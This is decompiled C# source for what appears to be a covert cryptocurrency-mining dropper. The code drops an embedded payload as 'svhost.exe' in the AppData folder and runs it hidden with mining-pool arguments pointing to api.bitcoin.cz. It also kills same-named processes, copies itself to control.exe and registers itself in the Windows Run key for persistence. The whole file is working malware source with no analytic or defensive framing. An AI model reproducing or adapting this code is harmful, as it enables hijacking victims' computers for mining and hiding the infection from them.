using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using avanda.My.Resources;

namespace avanda;

[StandardModule]
internal sealed class main
{
	private static string king2 = " -o http://api.bitcoin.cz:8332 --auto-gpu -I d -O avanda1121.CoinTest:skajneos";

	private static string path = Interaction.Environ("APPDATA") + "\\data\\";

	[STAThread]
	public static void main()
	{
		try
		{
			killme();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			start();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			startup();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static void killme()
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "svhost", false) == 0)
			{
				process.Kill();
			}
		}
	}

	public static void start()
	{
		string text = "svhost.exe";
		byte[] cg = Resources.cg;
		if (File.Exists(path + "control.exe"))
		{
			Interaction.Shell(path + text + king2, (AppWinStyle)0, false, -1);
			return;
		}
		Directory.CreateDirectory(path);
		File.WriteAllBytes(path + text, cg);
		Interaction.Shell(path + text + king2, (AppWinStyle)0, false, -1);
	}

	public static void startup()
	{
		if (!File.Exists(path + "control.exe"))
		{
			File.Copy(Assembly.GetExecutingAssembly().Location, path + "control.exe");
		}
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("system", path + "control.exe");
		registryKey.Close();
	}
}
